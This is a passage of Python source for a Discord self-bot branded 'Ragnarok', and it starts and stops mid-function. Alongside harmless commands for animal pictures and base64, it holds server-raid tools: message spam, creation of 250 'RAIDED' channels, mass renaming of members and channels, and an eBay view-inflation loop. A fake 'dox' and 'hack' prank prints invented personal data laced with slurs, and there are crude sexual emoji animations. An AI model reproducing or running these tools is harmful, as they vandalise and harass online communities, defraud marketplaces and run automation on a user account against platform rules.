            await a.edit(embed=embed)
            await asyncio.sleep(2)
            embed= discord.Embed(color= green_dark, title=f"Doxing in progress %100",description="Getting mom credit cards")
            embed.set_thumbnail(url="https://i.imgur.com/ZkFcOw6.gif")
            embed.set_footer(text=" MADE BY  Aura")
            await a.edit(embed=embed)
            await asyncio.sleep(2)
            embed= discord.Embed(color= green_dark, title=f"Dox of {user.name}")
            embed.set_thumbnail(url="https://i.imgur.com/ZkFcOw6.gif")
            embed.add_field(name=f'Email', value=f'{user.name}{nr}@{emaillist}', inline=False)
            embed.add_field(name=f'IP', value=f'{ip}', inline=False)
            embed.add_field(name=f'Country', value=f'{country}', inline=False)
            embed.set_footer(text=" MADE BY  Aura")
            await a.edit(embed=embed)
            await asyncio.sleep(2)
        except discord.HTTPException:
            a = await ctx.send("Doxing in progress %0 - Getting his email and address")
            await asyncio.sleep(2)
            await a.edit(content="Doxing in progress %50 - Getting ip and stuffs")
            await asyncio.sleep(2)
            await a.edit(content="Doxing in progress %100 - Getting mom credit cards")
            await asyncio.sleep(2)
            await a.edit(content=f"Dox of {user.name}:\n\nEmail: {user.name}{nr}@{emaillist}\nIP: {ip}\nCountry: {country}")

@Ragnarok.command()
async def raid(ctx, amount:int=None, *, message: str=None):
    await ctx.message.delete()
    try:
        if amount is None or message is None:
            await ctx.send(f"Usage: {ctx.prefix}spam <amount> <message>")
        else:
            for each in range (0, amount):
                await ctx.send(f"{message}")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@Ragnarok.command()
async def spfp(ctx):
    await ctx.message.delete()
    try:
        embed= discord.Embed(color= aqua, description=f"[Server Icon]({ctx.guild.icon_url})")
        embed.set_image(url=ctx.guild.icon_url)
        embed.set_footer(text=" MADE BY  Aura")
        await ctx.send(embed=embed)
    except discord.HTTPException:    
        await ctx.send(f"{ctx.guild.icon_url}")
    except:
        await ctx.send(f"You must be into a guild! For user avatar use {ctx.prefix}pfp <user>")

@Ragnarok.command()
async def cuttly(ctx, *, link): # b'\xfc'
    await ctx.message.delete()
    if cuttly_key == '':
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Cutt.ly API key has not been set in the config.json file"+Fore.RESET)
    else:
        try:
            req = requests.get(f'https://cutt.ly/api/api.php?key={cuttly_key}&short={link}')
            r = req.json()
            new = r['url']['shortLink']
            em = discord.Embed()
            em.add_field(name='Shortened link', value=new, inline=False)
            try:
                await ctx.send(embed=em)
            except:
                await ctx.send(new)    
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
        else:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{req.text}"+Fore.RESET)

@Ragnarok.command() 
async def cat(ctx): # b'\xfc'
    await ctx.message.delete()
    if cat_key == '':
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Cat API key has not been set in the config.json file"+Fore.RESET)
    else:
        try:
            req = requests.get(f"fhttps://api.thecatapi.com/v1/images/search?format=json&x-api-key={cat_key}")
            r = req.json()
            em = discord.Embed()
            em.set_image(url=str(r[0]["url"]))
            try:
                await ctx.send(embed=em)
            except:
                await ctx.send(str(r[0]["url"]))
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
        else:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{req.text}"+Fore.RESET)

@Ragnarok.command()
async def dog(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://dog.ceo/api/breeds/image/random").json()
    em = discord.Embed()
    em.set_image(url=str(r['message']))
    try:
        await ctx.send(embed=em)
    except:
        await ctx.send(str(r['message']))    

@Ragnarok.command()
async def fox(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get('https://randomfox.ca/floof/').json()
    em = discord.Embed(title="Random fox image", color=16202876)
    em.set_image(url=r["image"])
    try:
        await ctx.send(embed=em)
    except:
        await ctx.send(r['image'])    

@Ragnarok.command()
async def encode(ctx, string): # b'\xfc'
    await ctx.message.delete()
    decoded_stuff = base64.b64encode('{}'.format(string).encode('ascii'))
    encoded_stuff = str(decoded_stuff)
    encoded_stuff = encoded_stuff[2:len(encoded_stuff)-1]
    await ctx.send(encoded_stuff) 

@Ragnarok.command()
async def decode(ctx, string): # b'\xfc'+
    await ctx.message.delete()  
    strOne = (string).encode("ascii")
    pad = len(strOne)%4
    strOne += b"="*pad
    encoded_stuff = codecs.decode(strOne.strip(),'base64')
    decoded_stuff = str(encoded_stuff)
    decoded_stuff = decoded_stuff[2:len(decoded_stuff)-1]
    await ctx.send(decoded_stuff)

@Ragnarok.command(name='ebay-view', aliases=['ebay-view-bot', 'ebayviewbot', 'ebayview'])
async def _ebay_view(ctx, url, views: int): # b'\xfc'
    await ctx.message.delete()
    start_time = datetime.datetime.now()
    def EbayViewer(url, views):
        headers = {
           "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36",
           "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
        }        
        for _i in range(views):
            requests.get(url, headers=headers)
    EbayViewer(url, views)
    elapsed_time = datetime.datetime.now() - start_time
    em = discord.Embed(title='Ebay View Bot')
    em.add_field(name='Views sent', value=views, inline=False)
    em.add_field(name='Elapsed time', value=elapsed_time, inline=False)
    await ctx.send(embed=em)

@Ragnarok.command(aliases=['geolocate', 'iptogeo', 'iptolocation', 'ip2geo', 'ip'])
async def geoip(ctx, *, ipaddr: str = '1.3.3.7'): # b'\xfc'
    await ctx.message.delete()
    r = requests.get(f'http://extreme-ip-lookup.com/json/{ipaddr}')
    geo = r.json()
    em = discord.Embed()
    fields = [
        {'name': 'IP', 'value': geo['query']},
        {'name': 'ipType', 'value': geo['ipType']},
        {'name': 'Country', 'value': geo['country']},
        {'name': 'City', 'value': geo['city']},
        {'name': 'Continent', 'value': geo['continent']},
        {'name': 'Country', 'value': geo['country']},
        {'name': 'IPName', 'value': geo['ipName']},
        {'name': 'ISP', 'value': geo['isp']},
        {'name': 'Latitute', 'value': geo['lat']},
        {'name': 'Longitude', 'value': geo['lon']},
        {'name': 'Org', 'value': geo['org']},
        {'name': 'Region', 'value': geo['region']},
        {'name': 'Status', 'value': geo['status']},
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=True)
    return await ctx.send(embed=em)

@Ragnarok.command()
async def pingweb(ctx, website = None): # b'\xfc'
    await ctx.message.delete()
    if website is None: 
        pass
    else:
        try:
            r = requests.get(website).status_code
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
        if r == 404:
            await ctx.send(f'Site is down, responded with a status code of {r}', delete_after=3)
        else:
            await ctx.send(f'Site is up, responded with a status code of {r}', delete_after=3)       

@Ragnarok.command()
async def tweet(ctx, username: str, *, message: str): # b'\xfc'
    await ctx.message.delete()
    async with aiohttp.ClientSession() as cs:
        async with cs.get(f"https://nekobot.xyz/api/imagegen?type=tweet&username={username}&text={message}") as r:
            res = await r.json()
            em = discord.Embed()
            em.set_image(url=res["message"])
            await ctx.send(embed=em)

@Ragnarok.command()
async def revav(ctx, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    try:
        em = discord.Embed(description=f"https://images.google.com/searchbyimage?image_url={user.avatar_url}")
        await ctx.send(embed=em)
    except Exception as e:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)

@Ragnarok.command()
async def av(ctx, *, user: discord.Member = None):
    await ctx.message.delete()
    format = "gif"
    user = user or ctx.author
    if user.is_avatar_animated() != True:
        format = "png"
    avatar = user.avatar_url_as(format=format if format != "gif" else None)
    async with aiohttp.ClientSession() as session:
        async with session.get(str(avatar)) as resp:
            image = await resp.read()
    with io.BytesIO(image) as file:
        await ctx.send(file=discord.File(file, f"Avatar.{format}"))

@Ragnarok.command()
async def bird(ctx):
    await ctx.message.delete()
    r = requests.get("https://api.alexflipnote.dev/birb").json()
    link = str(r['file'])
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"exeter_bird.png"))
    except:
        await ctx.send(link)


@Ragnarok.command()
async def cyclenick(ctx, *, text):
    await ctx.message.delete()
    global cycling
    cycling = True
    while cycling:
        name = ""
        for letter in text:
            name = name + letter
            await ctx.message.author.edit(nick=name)

@Ragnarok.command()
async def nickall(ctx, nickname):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.edit(nick=nickname)
        except:
            pass

@Ragnarok.command()
async def renamechannels(ctx, *, name):
    await ctx.message.delete()
    for channel in ctx.guild.channels:
        await channel.edit(name=name)

@Ragnarok.command()
async def spamchannels(ctx):
    await ctx.message.delete()
    for _i in range(250):
        try:
            await ctx.guild.create_text_channel(name="RAIDED BY RAGNAROK SELF-BOT")
        except:
            return

@Ragnarok.command()
async def hack(ctx, user: discord.Member = None):
    await ctx.message.delete()
    gender = ["Male", "Female", "Trans", "Other", "Retard"]
    age = str(random.randrange(10, 25))
    height = ['4\'6\"', '4\'7\"', '4\'8\"', '4\'9\"', '4\'10\"', '4\'11\"', '5\'0\"', '5\'1\"', '5\'2\"', '5\'3\"',
              '5\'4\"', '5\'5\"',
              '5\'6\"', '5\'7\"', '5\'8\"', '5\'9\"', '5\'10\"', '5\'11\"', '6\'0\"', '6\'1\"', '6\'2\"', '6\'3\"',
              '6\'4\"', '6\'5\"',
              '6\'6\"', '6\'7\"', '6\'8\"', '6\'9\"', '6\'10\"', '6\'11\"']
    weight = str(random.randrange(60, 300))
    hair_color = ["Black", "Brown", "Blonde", "White", "Gray", "Red"]
    skin_color = ["White", "Pale", "Brown", "Black", "Light-Skin"]
    religion = ["Christian", "Muslim", "Atheist", "Hindu", "Buddhist", "Jewish"]
    sexuality = ["Straight", "Gay", "Homo", "Bi", "Bi-Sexual", "Lesbian", "Pansexual"]
    education = ["High School", "College", "Middle School", "Elementary School", "Pre School",
                 "Retard never went to school LOL"]
    ethnicity = ["White", "African American", "Asian", "Latino", "Latina", "American", "Mexican", "Korean", "Chinese",
                 "Arab", "Italian", "Puerto Rican", "Non-Hispanic", "Russian", "Canadian", "European", "Indian"]
    occupation = ["Retard has no job LOL", "Certified discord retard", "Janitor", "Police Officer", "Teacher",
                  "Cashier", "Clerk", "Waiter", "Waitress", "Grocery Bagger", "Retailer", "Sales-Person", "Artist",
                  "Singer", "Rapper", "Trapper", "Discord Thug", "Gangster", "Discord Packer", "Mechanic", "Carpenter",
                  "Electrician", "Lawyer", "Doctor", "Programmer", "Software Engineer", "Scientist"]
    salary = ["Retard makes no money LOL", "$" + str(random.randrange(0, 1000)), '<$50,000', '<$75,000', "$100,000",
              "$125,000", "$150,000", "$175,000",
              "$200,000+"]
    location = ["Retard lives in his mom's basement LOL", "America", "United States", "Europe", "Poland", "Mexico",
                "Russia", "Pakistan", "India",
                "Some random third world country", "Canada", "Alabama", "Alaska", "Arizona", "Arkansas", "California",
                "Colorado", "Connecticut", "Delaware", "Florida", "Georgia", "Hawaii", "Idaho", "Illinois", "Indiana",
                "Iowa", "Kansas", "Kentucky", "Louisiana", "Maine", "Maryland", "Massachusetts", "Michigan",
                "Minnesota", "Mississippi", "Missouri", "Montana", "Nebraska", "Nevada", "New Hampshire", "New Jersey",
                "New Mexico", "New York", "North Carolina", "North Dakota", "Ohio", "Oklahoma", "Oregon",
                "Pennsylvania", "Rhode Island", "South Carolina", "South Dakota", "Tennessee", "Texas", "Utah",
                "Vermont", "Virginia", "Washington", "West Virginia", "Wisconsin", "Wyoming"]
    email = ["@gmail.com", "@yahoo.com", "@hotmail.com", "@outlook.com", "@protonmail.com", "@disposablemail.com",
             "@aol.com", "@edu.com", "@icloud.com", "@gmx.net", "@yandex.com"]
    dob = f'{random.randrange(1, 13)}/{random.randrange(1, 32)}/{random.randrange(1950, 2021)}'
    name = ['James Smith', "Michael Smith", "Robert Smith", "Maria Garcia", "David Smith", "Maria Rodriguez",
            "Mary Smith", "Maria Hernandez", "Maria Martinez", "James Johnson", "Catherine Smoaks", "Cindi Emerick",
            "Trudie Peasley", "Josie Dowler", "Jefferey Amon", "Kyung Kernan", "Lola Barreiro",
            "Barabara Nuss", "Lien Barmore", "Donnell Kuhlmann", "Geoffrey Torre", "Allan Craft",
            "Elvira Lucien", "Jeanelle Orem", "Shantelle Lige", "Chassidy Reinhardt", "Adam Delange",
            "Anabel Rini", "Delbert Kruse", "Celeste Baumeister", "Jon Flanary", "Danette Uhler", "Xochitl Parton",
            "Derek Hetrick", "Chasity Hedge", "Antonia Gonsoulin", "Tod Kinkead", "Chastity Lazar", "Jazmin Aumick",
            "Janet Slusser", "Junita Cagle", "Stepanie Blandford", "Lang Schaff", "Kaila Bier", "Ezra Battey",
            "Bart Maddux", "Shiloh Raulston", "Carrie Kimber", "Zack Polite", "Marni Larson", "Justa Spear"]
    phone = f'({random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)})-{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}-{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}'
    if user is None:
        user = ctx.author
        password = ['password', '123', 'mypasswordispassword', user.name + "iscool123", user.name + "isdaddy",
                    "daddy" + user.name, "ilovediscord", "i<3discord", "furryporn456", "secret", "123456789", "apple49",
                    "redskins32", "princess", "dragon", "password1", "1q2w3e4r", "ilovefurries"]
        message = await ctx.send(f"`Hacking {user}...\n`")
        await asyncio.sleep(1)
        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\n`")
        await asyncio.sleep(1)
        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...\nFinalizing life-span dox details\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"```Successfully hacked {user}\nName: {random.choice(name)}\nGender: {random.choice(gender)}\nAge: {age}\nHeight: {random.choice(height)}\nWeight: {weight}\nHair Color: {random.choice(hair_color)}\nSkin Color: {random.choice(skin_color)}\nDOB: {dob}\nLocation: {random.choice(location)}\nPhone: {phone}\nE-Mail: {user.name + random.choice(email)}\nPasswords: {random.choices(password, k=3)}\nOccupation: {random.choice(occupation)}\nAnnual Salary: {random.choice(salary)}\nEthnicity: {random.choice(ethnicity)}\nReligion: {random.choice(religion)}\nSexuality: {random.choice(sexuality)}\nEducation: {random.choice(education)}```")
    else:
        password = ['password', '123', 'mypasswordispassword', user.name + "iscool123", user.name + "isdaddy",
                    "daddy" + user.name, "ilovediscord", "i<3discord", "furryporn456", "secret", "123456789", "apple49",
                    "redskins32", "princess", "dragon", "password1", "1q2w3e4r", "ilovefurries"]
        message = await ctx.send(f"`Hacking {user}...\n`")
        await asyncio.sleep(1)
        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\n`")
        await asyncio.sleep(1)
        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...\nFinalizing life-span dox details\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"```Successfully hacked {user}\nName: {random.choice(name)}\nGender: {random.choice(gender)}\nAge: {age}\nHeight: {random.choice(height)}\nWeight: {weight}\nHair Color: {random.choice(hair_color)}\nSkin Color: {random.choice(skin_color)}\nDOB: {dob}\nLocation: {random.choice(location)}\nPhone: {phone}\nE-Mail: {user.name + random.choice(email)}\nPasswords: {random.choices(password, k=3)}\nOccupation: {random.choice(occupation)}\nAnnual Salary: {random.choice(salary)}\nEthnicity: {random.choice(ethnicity)}\nReligion: {random.choice(religion)}\nSexuality: {random.choice(sexuality)}\nEducation: {random.choice(education)}```")

@Ragnarok.command()
async def fry(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://nekobot.xyz/api/imagegen?type=deepfry&image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"exeter_fry.png"))
        except:
            await ctx.send(res['message'])
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"exeter_fry.png"))
        except:
            await ctx.send(res['message'])

@Ragnarok.command()
async def magik(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://nekobot.xyz/api/imagegen?type=magik&intensity=3&image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"exeter_magik.png"))
        except:
            await ctx.send(res['message'])
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"exeter_magik.png"))
        except:
            await ctx.send(res['message'])

@Ragnarok.command()
async def gcn(ctx):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.GroupChannel):
        watermark = "RAGNAROK SELF-BOT"
        name = ""
        for letter in watermark:
            name = name + letter
            await ctx.message.channel.edit(name=name)


@Ragnarok.command()
async def sendall(ctx, *, message):
    await ctx.message.delete()
    try:
        channels = ctx.guild.text_channels
        for channel in channels:
            await channel.send(message)
    except:
        pass

@Ragnarok.command()
async def cum(ctx):
    await ctx.message.delete()
    message = await ctx.send('''
            :ok_hand:            :smile:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:=D 
             :trumpet:      :eggplant:''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :smiley:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D 
             :trumpet:      :eggplant:  
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :grimacing:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:=D 
             :trumpet:      :eggplant:  
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :persevere:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D 
             :trumpet:      :eggplant:   
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :confounded:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:=D 
             :trumpet:      :eggplant: 
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                       :ok_hand:            :tired_face:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D 
             :trumpet:      :eggplant:    
             ''')
    await asyncio.sleep(0.5)
    await message.edit(contnet='''
                       :ok_hand:            :weary:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:= D:sweat_drops:
             :trumpet:      :eggplant:        
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                       :ok_hand:            :dizzy_face:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D :sweat_drops:
             :trumpet:      :eggplant:                 :sweat_drops:
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                       :ok_hand:            :drooling_face:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D :sweat_drops:
             :trumpet:      :eggplant:                 :sweat_drops:
     ''')

@Ragnarok.command()
async def coinflip(ctx):
    await ctx.message.delete()
    lista = ['head', 'tails']
    coin = random.choice(lista)
    try:
        if coin == 'head':
            embed= discord.Embed(color= orange, title="Head")
            embed.set_thumbnail(url="https://webstockreview.net/images/coin-clipart-dime-6.png")
            embed.set_footer(text=" made by 0x72")
            await ctx.send(embed=embed)
        else:
            embed= discord.Embed(color= orange, title="Tails")
            embed.set_thumbnail(url="https://www.nicepng.com/png/full/146-1464848_quarter-tail-png-tails-on-a-coin.png")
            embed.set_footer(text=" made by 0x72")
            await ctx.send(embed=embed)
    except discord.HTTPException:
        if coin == 'head':
            await ctx.send("Coinflip: **Head**")
        else:
            await ctx.send("Coinflip: **Tails**")

@Ragnarok.command()
async def ipinfo(ctx, ip: str=None):
    await ctx.message.delete()
    if ip is None: await ctx.send("Please sepcify an IP address");return
    else:
        try:
            with requests.session() as ses:
                resp = ses.get(f'https://ipinfo.io/{ip}/json')
                if "Wrong ip" in resp.text:
                    await ctx.send("Invalid IP address")
                    return
                else:
                    try:
                        j = resp.json()
                        embed= discord.Embed(color= blue_light, title=f"INFO")
                        embed.add_field(name=f'IP', value=f'{ip}', inline=True)
                        embed.add_field(name=f'City', value=f'{j["city"]}', inline=True)
                        embed.add_field(name=f'Region', value=f'{j["region"]}', inline=True)
                        embed.add_field(name=f'Country', value=f'{j["country"]}', inline=True)
                        embed.add_field(name=f'Coordinates', value=f'{j["loc"]}', inline=True)
                        embed.add_field(name=f'Postal', value=f'{j["postal"]}', inline=True)
                        embed.add_field(name=f'Timezone', value=f'{j["timezone"]}', inline=True)
                        embed.add_field(name=f'Organization', value=f'{j["org"]}', inline=True)
                        embed.set_footer(text=" MADE BY  Aura")
                        await ctx.send(embed=embed)
                    except discord.HTTPException:
                        await ctx.send(f'**{ip} Info**\n\nCity: {j["city"]}\nRegion: {j["region"]}\nCountry: {j["country"]}\nCoordinates: {j["loc"]}\nPostal: {j["postal"]}\nTimezone: {j["timezone"]}\nOrganization: {j["org"]}')
        except Exception as e:
            await ctx.send(f"Error: {e}")

@Ragnarok.command()
async def ping(ctx):
    await ctx.message.delete()
    try:
        embed= discord.Embed(color= green_light, title=f"Pong")
        embed.set_footer(text=" MADE BY  Aura")
        before = time.monotonic()
        message = await ctx.send(embed=embed)
        await asyncio.sleep(1)
        ping = (time.monotonic() - before) * 1000
        embed= discord.Embed(color= green_light, title=f"Ping: {int(ping)}ms")
        embed.set_footer(text=" MADE BY  Aura")
        await message.edit(embed=embed)

    except discord.HTTPException:
        before = time.monotonic()
        message = await ctx.send("Pong!")
        ping = (time.monotonic() - before) * 1000
        await message.edit(content=f"Ping: `{int(ping)}ms`")

@Ragnarok.command()
async def pfp(ctx, user: discord.Member=None):
    await ctx.message.delete()
    if user is None:
        await ctx.send(f"Usage: {ctx.prefix}pfp <user>")
    else:
        try:
            embed= discord.Embed(color= purple_dark, description=f"[{user.name}'s Avatar]({user.avatar_url})")
            embed.set_image(url=user.avatar_url)
            embed.set_footer(text=" MADE BY  Aura")
            await ctx.send(embed=embed)
        except discord.HTTPException:    
            await ctx.send(f"{user.avatar_url}")
        except Exception as e:
            await ctx.send(f"Eror: {e}")    

@Ragnarok.command(aliases=['ri', 'role'])
async def roleinfo(ctx, *, role: discord.Role): # b'\xfc'
    await ctx.message.delete()
    guild = ctx.guild
    since_created = (ctx.message.created_at - role.created_at).days
    role_created = role.created_at.strftime("%d %b %Y %H:%M")
    created_on = "{} ({} days ago)".format(role_created, since_created)
    users = len([x for x in guild.members if role in x.roles])
    if str(role.colour) == "#000000":
        colour = "default"
        color = ("#%06x" % random.randint(0, 0xFFFFFF))
        color = int(colour[1:], 16)
    else:
        colour = str(role.colour).upper()
        color = role.colour
    em = discord.Embed(colour=color)
    em.set_author(name=f"Name: {role.name}"
    f"\nRole ID: {role.id}")
    em.add_field(name="Users", value=users)
    em.add_field(name="Mentionable", value=role.mentionable)
    em.add_field(name="Hoist", value=role.hoist)
    em.add_field(name="Position", value=role.position)
    em.add_field(name="Managed", value=role.managed)
    em.add_field(name="Colour", value=colour)
    em.add_field(name='Creation Date', value=created_on)
    await ctx.send(embed=em)

@Ragnarok.command()
async def whois(ctx, *, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    if isinstance(ctx.message.channel, discord.Guild):
        date_format = "%a, %d %b %Y %I:%M %p"
        em = discord.Embed(description=user.mention)
        em.set_author(name=str(user), icon_url=user.avatar_url)
        em.set_thumbnail(url=user.avatar_url)
        em.add_field(name="Registered", value=user.created_at.strftime(date_format))
        em.add_field(name="Joined", value=user.joined_at.strftime(date_format))
        members = sorted(ctx.guild.members, key=lambda m: m.joined_at)
        em.add_field(name="Join position", value=str(members.index(user) + 1))
        if len(user.roles) > 1:
            role_string = ' '.join([r.mention for r in user.roles][1:])
            em.add_field(name="Roles [{}]".format(len(user.roles) - 1), value=role_string, inline=False)
        perm_string = ', '.join([str(p[0]).replace("_", " ").title() for p in user.guild_permissions if p[1]])
        em.add_field(name="Permissions", value=perm_string, inline=False)
        em.set_footer(text='ID: ' + str(user.id))
        return await ctx.send(embed=em)
    else:
        date_format = "%a, %d %b %Y %I:%M %p"
        em = discord.Embed(description=user.mention)
        em.set_author(name=str(user), icon_url=user.avatar_url)
        em.set_thumbnail(url=user.avatar_url)
        em.add_field(name="Created", value=user.created_at.strftime(date_format))
        em.set_footer(text='ID: ' + str(user.id))
        return await ctx.send(embed=em)

@Ragnarok.command()
async def minesweeper(ctx, size: int = 5): # b'\xfc'
    await ctx.message.delete()
    size = max(min(size, 8), 2)
    bombs = [[random.randint(0, size - 1), random.randint(0, size - 1)] for x in range(int(size - 1))]
    is_on_board = lambda x, y: 0 <= x < size and 0 <= y < size
    has_bomb = lambda x, y: [i for i in bombs if i[0] == x and i[1] == y]
    message = "**Click to play**:\n"
    for y in range(size):
        for x in range(size):
            tile = "||{}||".format(chr(11036))
            if has_bomb(x, y):
                tile = "||{}||".format(chr(128163))
            else:
                count = 0
                for xmod, ymod in m_offets:
                    if is_on_board(x + xmod, y + ymod) and has_bomb(x + xmod, y + ymod):
                        count += 1
                if count != 0:
                    tile = "||{}||".format(m_numbers[count - 1])
            message += tile
        message += "\n"
    await ctx.send(message)

@Ragnarok.command()
async def combine(ctx, name1, name2): # b'\xfc'
    await ctx.message.delete()
    name1letters = name1[:round(len(name1) / 2)]
    name2letters = name2[round(len(name2) / 2):]
    ship = "".join([name1letters, name2letters])
    emb = (discord.Embed(description=f"{ship}"))
    emb.set_author(name=f"{name1} + {name2}")
    await ctx.send(embed=emb)       

@Ragnarok.command(name='1337-speak', aliases=['1337speak'])
async def _1337_speak(ctx, *, text): # b'\xfc'
    await ctx.message.delete()
    text = text.replace('a', '4').replace('A', '4').replace('e', '3')\
            .replace('E', '3').replace('i', '!').replace('I', '!')\
            .replace('o', '0').replace('O', '0').replace('u', '|_|').replace('U', '|_|')
    await ctx.send(f'`{text}`')

@Ragnarok.command(aliases=['dvwl'])
async def devowel(ctx, *, text): # b'\xfc'
    await ctx.message.delete()
    dvl = text.replace('a', '').replace('A', '').replace('e', '')\
            .replace('E', '').replace('i', '').replace('I', '')\
            .replace('o', '').replace('O', '').replace('u', '').replace('U', '')
    await ctx.send(dvl)




@Ragnarok.command()
async def ghost(ctx):
    await ctx.message.delete()
    if config.get('password') == 'password-here':
        print(f"{Fore.RED}[ERROR] {Fore.YELLOW}You didnt put your password in the config.json file" + Fore.RESET)
    else:
        password = config.get('password')
        with open('Images/Avatars/Transparent.png', 'rb') as f:
            try:
                await Ragnarok.user.edit(password=password, username="ٴٴٴٴ", avatar=f.read())
            except discord.HTTPException as e:
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)

@Ragnarok.command(aliases=['pfpget', 'stealpfp'])
async def pfpsteal(ctx, user: discord.Member): # b'\xfc'
    await ctx.message.delete()
    if config.get('password') == 'password-here':
        print(f"{Fore.RED}[ERROR] {Fore.YELLOW}You didnt put your password in the config.json file"+Fore.RESET)
    else:
        password = config.get('password')
        with open('Images/Avatars/Stolen/Stolen.png', 'wb') as f:
          r = requests.get(user.avatar_url, stream=True)
          for block in r.iter_content(1024):
              if not block:
                  break
              f.write(block)
        try:
            Image.open('Images/Avatars/Stolen/Stolen.png').convert('RGB')
            with open('Images/Avatars/Stolen/Stolen.png', 'rb') as f:
              await Ragnarok.user.edit(password=password, avatar=f.read())
        except discord.HTTPException as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)

@Ragnarok.command(name='set-pfp', aliases=['setpfp', 'pfpset'])
async def _set_pfp(ctx, *, url): # b'\xfc'
    await ctx.message.delete()
